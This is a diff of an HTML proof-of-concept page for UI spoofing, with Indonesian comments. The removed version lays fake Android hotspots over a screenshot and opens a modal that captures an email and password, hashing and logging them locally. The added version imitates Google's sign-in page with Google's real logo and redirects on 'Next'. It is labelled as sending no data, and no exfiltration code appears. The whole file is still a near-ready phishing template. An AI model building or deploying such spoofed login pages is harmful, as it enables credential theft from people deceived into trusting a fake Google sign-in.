@@ -1,216 +1,102 @@
-<!doctype html>
-<html lang="id">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-<title>PoC Mobile — Android Fullscreen UI Spoof Test</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Sign-in (UI Spoof PoC)</title>
 
 <style>
-/* ---- GLOBAL MOBILE STYLE ---- */
-html,body{
-  height:100%; margin:0; padding:0;
-  font-family:system-ui,Roboto,Arial;
-  background:#000;
-  overflow:hidden;
-  -webkit-touch-callout:none;
-  -webkit-user-select:none;
-}
-
-/* ---- FULLSCREEN BACKGROUND ---- */
-/* GUNAKAN GAMBAR ANDROID dengan resolusi tinggi */
-body::before{
-  content:"";
-  position:fixed; inset:0;
-  background-image:url('https://raw.githubusercontent.com/wildhan621/wildhan.github.io/main/Screenshot%202025-11-13%20161307.png');
-  background-size:cover;
-  background-position:center;
-  filter:brightness(0.98);
-  z-index:-1;
-}
-
-/* ---- WATERMARK ---- */
-.watermark{
-  position:fixed; top:10px; left:10px;
-  z-index:1000;
-  font-size:12px;
-  padding:5px 8px;
-  background:rgba(255,255,255,0.92);
-  border-radius:8px;
-  color:#c00; font-weight:700;
-}
-
-/* ---- HOTSPOT LAYER ---- */
-.hotspot-layer{
-  position:fixed; inset:0;
-  pointer-events:auto;
-  z-index:50;
-}
-.hotspot{
-  position:absolute;
-  background:rgba(255,0,0,0.05);
-  border:1px dashed rgba(255,0,0,0.10);
-  border-radius:10px;
-  transition:background .15s ease;
-  display:flex; justify-content:center; align-items:center;
-  font-size:12px; font-weight:700; color:#fff;
-}
-
-/* ---- MOBILE SIGN-IN MODAL ---- */
-.modal-backdrop{
-  position:fixed; inset:0;
-  background:rgba(0,0,0,0.5);
-  display:none;
-  z-index:2000;
-  justify-content:center;
-  align-items:center;
-  padding:12px;
-}
-
-.modal{
-  width:90%; max-width:380px;
-  background:rgba(255,255,255,0.97);
-  padding:18px;
-  border-radius:14px;
-  box-shadow:0 8px 38px rgba(0,0,0,0.45);
-}
-
-.modal h2{
-  margin:0 0 6px 0;
-  font-size:20px;
-}
-
-label{
-  display:block;
-  margin-top:12px;
-  font-size:14px;
-}
-
-input[type=text],
-input[type=password]{
-  width:100%;
-  padding:12px;
-  border-radius:10px;
-  border:1px solid #ccc;
-  font-size:15px;
-  margin-top:6px;
-}
-
-.btn{
-  padding:12px;
-  border-radius:10px;
-  border:none;
-  width:100%;
-  margin-top:12px;
-  font-weight:700;
-  font-size:15px;
-}
-
-.btn-primary{
-  background:#0b72ff;
-  color:#fff;
-}
-
-.btn-ghost{
-  background:#eee;
-  color:#333;
-}
-
-.log-box{
-  margin-top:12px;
-  background:#0b1220;
-  color:#e8f1ff;
-  padding:8px;
-  font-size:12px;
-  border-radius:8px;
-  max-height:160px;
-  overflow:auto;
-}
+    body {
+        background: #f2f2f2;
+        font-family: 'Roboto', sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+    .card {
+        background: #fff;
+        width: 360px;
+        padding: 32px 28px;
+        border-radius: 12px;
+        box-shadow: 0 4px 18px rgba(0,0,0,0.12);
+    }
+    .google-logo {
+        width: 75px;
+        display: block;
+        margin: 0 auto 20px auto;
+    }
+    h2 {
+        font-weight: 500;
+        text-align: center;
+        margin-bottom: 12px;
+    }
+    p {
+        color: #555;
+        text-align: center;
+        font-size: 14px;
+        margin-top: -4px;
+        margin-bottom: 24px;
+    }
+    .input-field {
+        width: 100%;
+        padding: 14px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        font-size: 15px;
+        outline: none;
+    }
+    .input-field:focus {
+        border-color: #4285f4;
+    }
+    .btn {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        background: #1a73e8;
+        color: #fff;
+        font-size: 15px;
+        border-radius: 6px;
+        cursor: pointer;
+        margin-top: 24px;
+    }
+    .btn:hover {
+        background: #1669c1;
+    }
+    .footer {
+        text-align: center;
+        margin-top: 18px;
+        font-size: 12px;
+        color: #777;
+    }
 </style>
 </head>
-
 <body>
 
-<div class="watermark">PoC Android</div>
+<div class="card">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo">
+    <h2>Sign in</h2>
+    <p>Use your Google Account</p>
 
-<!-- HOTSPOTS ANDROID -->
-<div class="hotspot-layer">
-  <!-- Sesuaikan posisi sesuai UI Android -->
-  <div class="hotspot" id="hsSignIn"
-       style="left:55vw; top:62vh; width:30vw; height:7vh;">
-    Sign in
-  </div>
+    <input 
+        type="text" 
+        placeholder="Email or phone" 
+        class="input-field"
+    >
 
-  <div class="hotspot" id="hsCreate"
-       style="left:55vw; top:72vh; width:30vw; height:7vh;">
-    Create
-  </div>
-</div>
+    <!-- tombol berfungsi -->
+    <button class="btn" onclick="redirect()">Next</button>
 
-<!-- MODAL -->
-<div class="modal-backdrop" id="backdrop">
-  <div class="modal">
-    <h2 id="modalTitle">Sign in</h2>
-
-    <label>Email</label>
-    <input type="text" id="email" placeholder="user@example.com">
-
-    <label>Password</label>
-    <input type="password" id="pwd" placeholder="••••••••">
-
-    <button class="btn btn-primary" id="submitBtn">Simulasi Sign in</button>
-    <button class="btn btn-ghost" id="cancelBtn">Batal</button>
-
-    <div class="log-box" id="log">Log Android…</div>
-  </div>
+    <div class="footer">
+        PoC UI Spoofing • No data is sent
+    </div>
 </div>
 
 <script>
-function log(msg){
-  const logEl = document.getElementById("log");
-  logEl.textContent = "["+ new Date().toLocaleTimeString() +"] " + msg + "\n" + logEl.textContent;
+function redirect() {
+    // Halaman tujuan redirect
+    window.location.href = "https://example.com";
 }
-
-/* HOTSPOT EVENTS */
-document.getElementById("hsSignIn").addEventListener("click",()=>{
-  document.getElementById("modalTitle").textContent = "Sign in";
-  document.getElementById("backdrop").style.display="flex";
-  log("Open modal (signin)");
-});
-
-document.getElementById("hsCreate").addEventListener("click",()=>{
-  document.getElementById("modalTitle").textContent = "Create account";
-  document.getElementById("backdrop").style.display="flex";
-  log("Open modal (create)");
-});
-
-/* MODAL BUTTONS */
-document.getElementById("cancelBtn").addEventListener("click",()=>{
-  document.getElementById("backdrop").style.display="none";
-  log("Modal closed");
-});
-
-/* HASHING */
-async function sha256Hex(text){
-  const data = new TextEncoder().encode(text);
-  const digest = await crypto.subtle.digest("SHA-256", data);
-  return Array.from(new Uint8Array(digest)).map(b=>b.toString(16).padStart(2,"0")).join("");
-}
-
-/* SUBMIT */
-document.getElementById("submitBtn").addEventListener("click",async()=>{
-  const email = document.getElementById("email").value.trim();
-  const pwd = document.getElementById("pwd").value;
-
-  if(!email && !pwd){
-    log("No data typed");
-    return;
-  }
-
-  const masked = email ? email[0]+"***@"+email.split("@")[1] : "";
-  const hash = await sha256Hex(pwd + "::ANDROID_SALT");
-
-  log("Captured — masked: "+masked+" | len: "+pwd.length+" | hash: "+hash.slice(0,12)+"...");
-});
 </script>
 
 </body>
